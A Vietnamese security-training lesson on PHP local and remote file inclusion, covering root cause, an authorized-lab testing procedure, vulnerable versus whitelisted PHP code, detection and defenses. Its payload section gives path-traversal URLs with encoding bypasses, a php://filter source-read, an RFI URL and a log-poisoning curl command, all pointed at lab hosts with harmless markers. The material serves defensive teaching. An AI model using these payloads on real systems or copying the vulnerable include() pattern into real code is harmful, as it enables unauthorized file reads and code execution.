---
schema_version: 1
id: WEB-A05-LFI-RFI
title: "Local/Remote File Inclusion (LFI/RFI)"
slug: lfi-rfi
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A05:2025
  - A08:2025
cwe:
  - CWE-98
  - CWE-829
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# Local/Remote File Inclusion (LFI/RFI)

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích Local/Remote File Inclusion (LFI/RFI) bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response của tình huống Local/Remote File Inclusion (LFI/RFI) và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

Để các trang web hoạt động linh hoạt, lập trình viên thường sử dụng tính năng nạp file động (file inclusion). Hãy tưởng tượng tính năng này giống như việc bạn xây dựng một khung ảnh trống trên trang web, và tùy thuộc vào lựa chọn của người dùng (ví dụ: chọn ngôn ngữ tiếng Anh hay tiếng Việt), ứng dụng sẽ nạp bức ảnh hoặc tệp tin tương ứng vào khung đó. Trong ngôn ngữ PHP, các hàm như `include` hay `require` được dùng để thực hiện việc này. Nếu nạp các file nằm sẵn trên máy chủ của bạn, đó gọi là nạp file cục bộ (LFI). Nếu nạp các file từ một địa chỉ internet khác, đó gọi là nạp file từ xa (RFI).

```php
<?php
// Normal usage — loading language file based on user preference
$lang = $_GET['lang'];       // e.g., "en", "vi", "fr"
include("languages/" . $lang . ".php");
// Loads languages/en.php, languages/vi.php, etc.
?>
```

Tương tự, Python có `importlib`, Java có `ClassLoader`, nhưng PHP là mục tiêu chính vì `include()` **thực thi nội dung file** — bất kể nguồn gốc.

**LFI (Local File Inclusion)**: Include file từ hệ thống local server.
**RFI (Remote File Inclusion)**: Include file từ URL bên ngoài (yêu cầu `allow_url_include=On` trong php.ini).

## 4. Mô tả và nguyên nhân gốc

Lỗ hổng File Inclusion xuất hiện khi ứng dụng để input quyết định tệp cục bộ hoặc tài nguyên từ xa được đưa vào cơ chế include. Với local inclusion, phân đoạn đường dẫn tương đối hoặc một ánh xạ tệp quá rộng có thể đưa quá trình đọc ra ngoài tập template được phép. Với remote inclusion, tác động còn phụ thuộc runtime và việc cấu hình có cho phép include URL hay không; không được mặc định suy ra thực thi mã chỉ từ khả năng đọc tệp. Payload local vô hại và điều kiện cấu hình remote được tách riêng ở mục 8. [S2] [S3]

> **Nguồn tham khảo:** các claim kỹ thuật trong bài được gắn marker nguồn; khi áp dụng thực tế, hãy đối chiếu phiên bản/framework đang dùng: [S1], [S2], [S3], [S4], [S5].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** template/locale được phép và filesystem container.
- **Actor, xác thực và role:** role user chọn page/locale; không có quyền filesystem.
- **Điều kiện khai thác:** path/URL từ client đi vào include mà không qua ánh xạ resource cố định.
- **Browser, proxy, framework và phiên bản:** PHP 8.2/Apache 2.4 container, ghi rõ trạng thái allow_url_include; loopback; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với lfi rfi, path/URL từ client đi vào include mà không qua ánh xạ resource cố định. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy PHP 8.2/Apache 2.4 container, ghi rõ trạng thái allow_url_include; loopback; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case lfi rfi; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “path/URL từ client đi vào include mà không qua ánh xạ resource cố định”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của lfi rfi; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các block dưới đây là ví dụ lab tối thiểu theo đúng context đã ghi trong annotation. Trước khi dùng, đối chiếu framework/phiên bản, encoding, expected result và risk; chỉ chạy trong fixture local có ủy quyền. Payload mở rộng thuộc `security_cheatsheet.md`; lesson chỉ giữ ví dụ cốt lõi.

**LFI — Path Traversal để đọc file hệ thống**:

<!-- payload-id: WEB-A05-LFI-RFI-001 -->
<!-- context: PHP 8.3 local file-include fixture with /fixtures/lab-marker.txt -->
<!-- prerequisites: synthetic fixture files only; container filesystem isolated from the host -->
<!-- encoding: path separators are literal for baseline; double-encoded case is decoded by each documented fixture layer exactly once -->
<!-- expected-result: response contains LAB_FILE_MARKER from the synthetic fixture file -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Basic traversal to a synthetic file mounted by the fixture
https://victim.lab.test/page.php?file=../../../../fixtures/lab-marker.txt

# Historical null-byte variant: only relevant to PHP versions before 5.3.4
https://victim.lab.test/page.php?file=../../../../fixtures/lab-marker.txt%00

# Double encoding to bypass basic filters
https://victim.lab.test/page.php?file=..%252f..%252f..%252ffixtures%252flab-marker.txt
```

**PHP Wrappers — Đọc source code dưới dạng Base64**:

<!-- payload-id: WEB-A05-LFI-RFI-002 -->
<!-- context: PHP 8.3 php://filter read-only fixture -->
<!-- prerequisites: config.php contains synthetic values only; allow_url_include is disabled -->
<!-- encoding: wrapper URI is UTF-8 and query-encoded once; slash and colon remain in the decoded file parameter -->
<!-- expected-result: response is Base64 that decodes to the synthetic config marker -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# php://filter wrapper to read source code without executing it
https://victim.lab.test/page.php?file=php://filter/convert.base64-encode/resource=config.php
# The fixture returns Base64-encoded synthetic config content.
```

**RFI — include nội dung PHP từ mock server local**:

<!-- payload-id: WEB-A05-LFI-RFI-003 -->
<!-- context: legacy PHP fixture with allow_url_include enabled and a local mock HTTP server -->
<!-- prerequisites: rfi-fixture.lab.test resolves to loopback; no outbound network -->
<!-- encoding: absolute HTTP URL is percent-encoded once as the file query value; mock body is UTF-8 PHP -->
<!-- expected-result: response contains RFI_LAB from the local mock file; no command is executed -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# The local mock serves: <?php echo 'RFI_LAB'; ?>

https://victim.lab.test/page.php?file=http://rfi-fixture.lab.test/lab.txt
# The vulnerable fixture fetches and evaluates the mock PHP content.
```

**LFI + Log Poisoning**:

<!-- payload-id: WEB-A05-LFI-RFI-004 -->
<!-- context: Apache/PHP disposable fixture includes its synthetic access log after one marker request -->
<!-- prerequisites: lab access log mounted inside container; User-Agent marker has no filesystem/network operation; two requests total -->
<!-- encoding: curl sends UTF-8 User-Agent; traversal path is query-encoded once and resolves only inside container -->
<!-- expected-result: vulnerable include prints LOG_POISONING_LAB; secure resource mapping never opens the access log -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Step 1: Put a harmless marker expression in the disposable access log.
curl -A "<?php echo 'LOG_POISONING_LAB'; ?>" https://victim.lab.test/

# Step 2: Include the poisoned log file
https://victim.lab.test/page.php?file=../../../../var/log/apache2/access.log
```

## 9. Code dễ bị lỗi và code an toàn

```php
<?php
// === VULNERABLE CODE ===
$page = $_GET['page'];
// DANGER: User input directly controls file inclusion
include("templates/" . $page);


// === SECURE CODE ===

// Whitelist of allowed pages
$allowed_pages = [
    'home'    => 'home.php',
    'about'   => 'about.php',
    'contact' => 'contact.php',
];

$page = $_GET['page'] ?? 'home';

// Only include files from the predefined whitelist
if (array_key_exists($page, $allowed_pages)) {
    $safe_path = __DIR__ . '/templates/' . $allowed_pages[$page];

    // Verify resolved path is within templates directory
    $real_path = realpath($safe_path);
    $base_dir  = realpath(__DIR__ . '/templates/');

    if ($real_path && strpos($real_path, $base_dir) === 0) {
        include($real_path);
    } else {
        http_response_code(403);
        echo "Access denied";
    }
} else {
    http_response_code(404);
    echo "Page not found";
}
?>
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource liên quan đến Local/Remote File Inclusion (LFI/RFI), kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Ánh xạ ID nghiệp vụ sang file cố định, kiểm tra canonical containment và tắt remote include.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Với Local/Remote File Inclusion (LFI/RFI), các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

- **Tóm tắt**: Hạn chế sử dụng dữ liệu từ người dùng để định tuyến đường dẫn tệp tin, cấu hình tắt tính năng bao gồm tệp từ xa và kiểm soát thư mục truy cập.
- **Các bước chi tiết**:
  - Whitelist file names: Chỉ cho phép include từ danh sách file được định nghĩa trước, không dùng user input trực tiếp.
  - Disable `allow_url_include`: Tắt trong php.ini để ngăn chặn RFI hoàn toàn.
  - Không dựa vào `basename()` để chứng minh containment; ánh xạ ID sang template cố định hoặc phân giải canonical rồi kiểm tra thư mục cho phép.
  - `open_basedir` restriction: Giới hạn PHP chỉ truy cập file trong thư mục ứng dụng.
  - Chuyển sang template engine: Sử dụng Twig, Blade thay vì `include()` trực tiếp.

## 12. Retest

- **Positive case:** với Local/Remote File Inclusion (LFI/RFI), luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Tái kiểm tra:** lưu kịch bản tối thiểu tái hiện lỗi cũ và chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi của Local/Remote File Inclusion (LFI/RFI) mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Kết luận lỗ hổng tồn tại khi chưa lưu lại nguồn, phiên bản fixture và bằng chứng quan sát được.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim kỹ thuật nhạy cảm có nguồn tham khảo ở mục 17 và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **LFI (Local File Inclusion)**: Lỗ hổng nạp tệp tin cục bộ từ máy chủ của ứng dụng.
- **RFI (Remote File Inclusion)**: Lỗ hổng nạp tệp tin từ xa từ máy chủ bên ngoài thông qua URL.
- **Log Poisoning**: Kỹ thuật chèn mã độc vào file nhật ký rồi dùng LFI để thực thi mã đó.
- **Web Shell**: File mã độc cho phép kẻ tấn công điều khiển máy chủ thông qua giao diện web.
- **Directory Traversal**: Kỹ thuật làm đường dẫn đã phân giải thoát khỏi thư mục mà chức năng được phép truy cập.

## 16. Bài liên quan và đọc thêm

- [File Upload](../../06-insecure-design/file-upload/) — Tải lên các tệp tin độc hại là một vector phổ biến để kết hợp và khai thác lỗ hổng Local File Inclusion (LFI).

## 17. Tài liệu tham khảo

- **[S1]** PortSwigger. https://portswigger.net/web-security/file-path-traversal — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S2]** OWASP WSTG — Testing for File Inclusion. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion — phiên bản/trạng thái: latest; truy cập: 2026-07-17.
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/98.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S4]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S5]** CWE-829. https://cwe.mitre.org/data/definitions/829.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
